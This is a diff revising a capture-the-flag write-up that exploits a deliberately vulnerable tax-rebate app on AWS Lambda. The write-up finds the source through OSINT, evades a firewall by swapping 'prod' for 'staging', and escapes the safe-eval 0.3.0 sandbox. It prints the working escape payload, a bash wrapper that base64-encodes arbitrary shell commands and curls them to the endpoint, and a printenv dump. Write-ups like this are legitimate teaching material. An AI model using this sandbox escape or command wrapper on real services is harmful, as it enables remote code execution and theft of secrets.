@@ -4,32 +4,70 @@
 Apparently, the lead engineer left the company ("Safe Online Technologies"). He was a talented engineer and worked on many projects relating to Smart City. He goes by the handle `c0v1d-agent-1`. Everyone didn't know what this meant until COViD struck us by surprise. We received a tip-off from his colleagues that he has been using vulnerable code segments in one of a project he was working on! Can you take a look at his latest work and determine the impact of his actions! Let us know if such an application can be exploited!  
 [Tax rebate checker](http://z8ggp.tax-rebate-checker.cf/)
 
+## A First Look
+This time, the frontend was hosted on Google Cloud Platform: 
+
+Unfortunately, it's not the most factually accurate or exciting page...
+
+![The Site](site.png)
+
+_You can literally only type anything satisfying `([0-9e])+`._
+
+Clearly, the challenge does not intend for us to exploit the front-end of the website. So we have to exploit the back-end(duh).
+
+But to exploit the back-end, we need to find/leak the source code for any files or APIs. Where do we go to find such a thing?
+
+## Preliminary Reconnaissance
+
+Taking a look at the problem statement, we see that the engineer that worked on this had went by the handle `c0v1d-agent-1`.
+
+So we searched the handle up on GitHub and...
+
+![Found](user.png)
+
+Bingo.
+
 ## Finding the Exploit
-This time, the frontend was hosted on Google Cloud Platform:
+
+Before we exploit the page, we must first **find** the exploit.
+
+### Backend Reconnaissance
+
+To look for any API calls (We are using Chrome/Firefox), go to:
+
+- (Chrome) "Developer Tools" -> "Network" tab 
+- (Firefox) idk @sheepymeh
+
+Send a bogus request like so:
+
+![bogus request](bogus.png)
+
+Et voilá!
+
+![bogus response](bogus_resp.png)
+
+From this bogus request, we can see that the website sends a POST request to
 
 ```
-$ curl -v http://z8ggp.tax-rebate-checker.cf/
-...
-< HTTP/1.1 200 OK
-< X-GUploader-UploadID: ABg5-UwbFLtFsPubVCx8sxKMuCR8qsX1ZzoCw8DiaG34sDXnnUs7YZ7T2c-MbLkoUOUn-ztbbri2R6ZYZ8zX_eL1hzc
-< x-goog-generation: 1606418262624802
-< x-goog-metageneration: 1
-< x-goog-stored-content-encoding: identity
-< x-goog-stored-content-length: 774
-< x-goog-hash: crc32c=mMvjHQ==
-< x-goog-hash: md5=wVoFqiGGeVXoDandOpY2SA==
-< x-goog-storage-class: STANDARD
-< Server: UploadServer
-...
+https://cors-anywhere.herokuapp.com/ <- (this part is not important)
+
+https://af7jsq9nlh.execute-api.ap-southeast-1.amazonaws.com/prod/tax-rebate-checker <- (this part is very important)
 ```
 
-However, the backend (presumably what we needed to hack) was hosted on AWS, behind [AWS API Gateway](https://aws.amazon.com/api-gateway/), and presumably using [AWS Lambda](https://aws.amazon.com/lambda/) as the backend. We knew this because the API sent a POST request to https://af7jsq9nlh.execute-api.ap-southeast-1.amazonaws.com/prod/tax-rebate-checker, the endpoint for API Gateway, and Lambda was often used with API Gateway.
+Immediately, we can deduce that:
 
-Next, some OSINT skills werre needed to find the repository hosting the source code: https://github.com/c0v1d-agent-1/tax-rebate-checker.
+- The backend is hosted on [AWS](https://aws.amazon.com/api-gateway/)
+- [AWS Lambda](https://aws.amazon.com/lambda/) is the backend handler.
 
-As we knew that there was a "vulnerable code segment", we suspected that there were vulnerable dependencies. This was shown in the GitHub issue, where `c0v1d-agent-1` said that:
+### Diving into Github
 
-> One of the libraries used by the function was vulnerable. Resolved by attaching a WAF to the `prod` deployment. WAF will not to be attached `staging` deployment there is no real impact.
+In grabbing information from Github, we found something really interesting:
+![interesting](interesting.png)
+
+We now know that:
+
+- There is a vulnerable library being used.
+- If we change the API URL from 'prod' to 'staging', we can just circumvent WAF (to add: a more in-depth explanation of "what is WAF?")
 
 As the application was running on Node.js, we can find the dependencies in `package.json`:
 
@@ -50,15 +88,27 @@ As the application was running on Node.js, we can find the dependencies in `pack
 }
 ```
 
-Sure enough, `safe-eval 0.3.0` has a [critical vulnerability](https://github.com/hacksparrow/safe-eval/issues/5) to be exploited. To bypass the WAF (web application firewall), we just need to swtich from `prod` to `staging` in the URL: https://af7jsq9nlh.execute-api.ap-southeast-1.amazonaws.com/staging/tax-rebate-checker. _(easiest WAF bypass on earth: done)_
+Despite it's name literally saying `safe`, we are pretty sure `c0v1d-agent-1` was talking about `safe-eval`.
 
-Now, it's time to exploit the vulnerability and use web skills. The [vulnerable line](https://github.com/c0v1d-agent-1/tax-rebate-checker/blob/main/index.js#L13) uses:
+Sure enough, `safe-eval 0.3.0` has a [critical vulnerability](https://github.com/hacksparrow/safe-eval/issues/5) to be exploited. (to add: explain what the person is doing. why does this bypass safe-eval?)
+
+## Exploiting the Exploit
+
+To recap, we just need to switch from `prod` to `staging` in the API URL, to bypass the WAF: https://af7jsq9nlh.execute-api.ap-southeast-1.amazonaws.com/staging/tax-rebate-checker. _(easiest WAF bypass on earth: done)_
+
+From `index.js`, we can see that the [vulnerable line](https://github.com/c0v1d-agent-1/tax-rebate-checker/blob/main/index.js#L13) uses:
 
 ```js
 safeEval((new Buffer(body.age, 'base64')).toString('ascii') + " + " + (new Buffer(body.salary, 'base64')).toString('ascii') + " * person.code",context);
 ```
 
-i.e. we need to put our payload in `body.age`, then comment the rest of the string (quite similar to SQL injection, actually). Our payload would look like this:
+This means that:
+
+- We have to put our payload in `body.age` (or else Node.js will screw up our exploit) (to add: can you show how it will screw up our exploit?) `
+_note that doing this the other way round (payload in salary) does not work syntactically. either a leading "+" will be present, or the eval will return the value of the sum instead_`
+- Whatever values for `body.age` and `body.salary` we have to pass in needs to be in base64.
+
+Hence, our payload wrapper would look like this:
 
 ```js
 {
@@ -67,43 +117,45 @@ i.e. we need to put our payload in `body.age`, then comment the rest of the stri
 }
 ```
 
-_note that doing this the other way round (payload in salary) does not work syntactically. either a leading "+" will be present, or the eval will return the value of the sum instead_
+We found an example payload [here](https://snyk.io/vuln/SNYK-JS-SAFEEVAL-608076), but it did not work for AWS's newer version of Node.js (later determined to be Node.js 12.19.0 with `node --version`). We dug a bit deeper in the GitHub issues and found an [updated payload to use](https://github.com/hacksparrow/safe-eval/issues/18#issuecomment-592644871).  (to add: explain how this exploit works)
 
-An example payload was found [here](https://snyk.io/vuln/SNYK-JS-SAFEEVAL-608076), but it did not work for AWS's newer version of Node.js (later emperically determined to be Node.js 12.19.0 with `node --version`). We dug a bit deeper in the GitHub issues and found an [updated payload to use](https://github.com/hacksparrow/safe-eval/issues/18#issuecomment-592644871). We would just need to replace `whoami` with our preferred shell command to run arbitrary commands.
+We just need to replace `whoami` with our preferred shell command to run arbitrary commands.
 
 ## Finding the flag
-_([skip to solution](#solution))_
+_([skip to solution](#solution))_ (hmm, should this be here?)
 
-Now we're in the Lambda function, RCE in hand. However, no hints were given about where the flag was located.
+Now we are in the Lambda function, RCE in hand. However, no hints were given about where the flag was located.
 
-First we suspected that the file might have been part of the Lambda deployment package. We knew that Lambda only allows [functions to write to `/tmp` (during execution)](https://forums.aws.amazon.com/thread.jspa?threadID=174119), and [Lambda Layers are written to `/opt`](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html). When `ls` on these two directories did not succeed, we tried a recursive `ls` on the `/`, but quickly hit the [default execution time limit of 3s](https://docs.aws.amazon.com/lambda/latest/dg/gettingstarted-limits.html).
+To avoid wasting time, we drew up a shell file to perform any command we wanted quickly:
+```bash
+ste="(function (){delete this.constructor;const HostObject = this.constructor;const HostFunction = HostObject.is.constructor;const process = HostFunction('return process')();return process.mainModule.require('child_process').execSync('COMMAND').toString();})()//"
+
+echo -n "Command? "
+read rep
+
+wow=$(echo -n "${ste/COMMAND/$rep}" | base64 | tr -d " \t\n\r")
+
+curl https://af7jsq9nlh.execute-api.ap-southeast-1.amazonaws.com/staging/tax-rebate-checker --data '{"age":'\"$wow\"',"salary":"123"}' -H 'Content-Type: application/json'
+```
+
+Essentially all we did was:
+
+- Input any command we want (well... not [really](#Appendix-A) )
+
+First we suspected that the file might have been part of the Lambda deployment package. We knew that Lambda only allows [functions to write to `/tmp` (during execution)](https://forums.aws.amazon.com/thread.jspa?threadID=174119), and [Lambda Layers are written to `/opt`](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html). 
+
+When `ls` on these two directories did not succeed, we tried `ls -R` (recursive) on the root directory, but quickly hit the [default execution time limit of 3s](https://docs.aws.amazon.com/lambda/latest/dg/gettingstarted-limits.html).
 
 Next, we tried to use SSRF to use the [metadata service](https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/) available on AWS. (to be written)
 
 ### Solution
-Finally, we realized that we forgot the existence of environment variables, where Lambda functions commonly store secrets and configuration data:
+Finally, it hit us that environment variables existed. **GROUNDBREAKING DISCOVERY**.
+
+This is where Lambda functions commonly store secrets and configuration data:
 
 ![Environment variables used in Lambda](env.png)
 
-In order to print this out, we decided to use the `printenv` command. Our payload was:
-
-```js
-(function() {
-    delete this.constructor;
-    const HostObject = this.constructor;
-    const HostFunction = HostObject.is.constructor;
-    const process = HostFunction('return process')();
-    return process.mainModule.require('child_process').execSync("printenv").toString();
-})()//
-```
-
-which led to the `curl` command:
-
-```
-$ curl https://af7jsq9nlh.execute-api.ap-southeast-1.amazonaws.com/staging/tax-rebate-checker -H 'Content-Type: application/json' --data '{"salary":"","age":"KGZ1bmN0aW9uKCl7ZGVsZXRlIHRoaXMuY29uc3RydWN0b3I7Y29uc3QgSG9zdE9iamVjdCA9IHRoaXMuY29uc3RydWN0b3I7Y29uc3QgSG9zdEZ1bmN0aW9uID0gSG9zdE9iamVjdC5pcy5jb25zdHJ1Y3Rvcjtjb25zdCBwcm9jZXNzID0gSG9zdEZ1bmN0aW9uKCdyZXR1cm4gcHJvY2VzcycpKCk7cmV0dXJuIHByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoInByaW50ZW52IikudG9TdHJpbmcoKTt9KSgpLy8="}'
-```
-
-after removing whitespace from the payload. The environment variables were returned as follows:
+In order to print this out, we decided to use the `printenv` command.
 
 ```
 AWS_LAMBDA_FUNCTION_VERSION=$LATEST
@@ -115,3 +167,48 @@ flag=3nv_L0oK$-G$$D!
 ```
 govtech-csg{3nv_L0oK$-G$$D!}
 ```
+
+
+Not sure if you still need this.
+
+```
+$ curl -v http://z8ggp.tax-rebate-checker.cf/
+...
+< HTTP/1.1 200 OK
+< X-GUploader-UploadID: ABg5-UwbFLtFsPubVCx8sxKMuCR8qsX1ZzoCw8DiaG34sDXnnUs7YZ7T2c-MbLkoUOUn-ztbbri2R6ZYZ8zX_eL1hzc
+< x-goog-generation: 1606418262624802
+< x-goog-metageneration: 1
+< x-goog-stored-content-encoding: identity
+< x-goog-stored-content-length: 774
+< x-goog-hash: crc32c=mMvjHQ==
+< x-goog-hash: md5=wVoFqiGGeVXoDandOpY2SA==
+< x-goog-storage-class: STANDARD
+< Server: UploadServer
+...
+```
+
+## Appendix A
+We initially tried a lot of commands like `find` etc. However, we noticed that they couldn't be found.
+
+Being curious and also rather intellectually challenged, we decided to look up all the commands with `ls /usr/bin`.
+
+After some clean-up, we ended up with:
+```
+alias arch awk base64 basename bash bashbug bashbug-64 bg 
+ca-legacy captoinfo cat catchsegv cd chcon chgrp chmod chown cksum 
+clear comm command cp csplit cut date dd df dgawk dir dircolors 
+dirname du echo egrep env expand expr factor false fc fg fgrep fmt 
+fold gawk gencat getconf getent getopts grep groups head hostid 
+iconv id igawk info infocmp infokey infotocap install jobs join 
+ldd link ln locale localedef logname ls makedb md5sum mkdir mkfifo 
+mknod mktemp mv nice nl nohup nproc numfmt od p11-kit paste 
+pathchk pgawk pinky pldd pr printenv printf ptx pwd read readlink 
+realpath reset rm rmdir rpcgen runcon sed seq sh sha1sum sha224sum 
+sha256sum sha384sum sha512sum shred shuf sleep sort sotruss split 
+sprof stat stdbuf stty sum sync tabs tac tail tee test tic timeout 
+toe touch tput tr true truncate trust tset tsort tty tzselect 
+umask unalias uname unexpand uniq unlink update-ca-trust users 
+vdir wait wc who whoami yes 
+```
+
+**Interesting.**
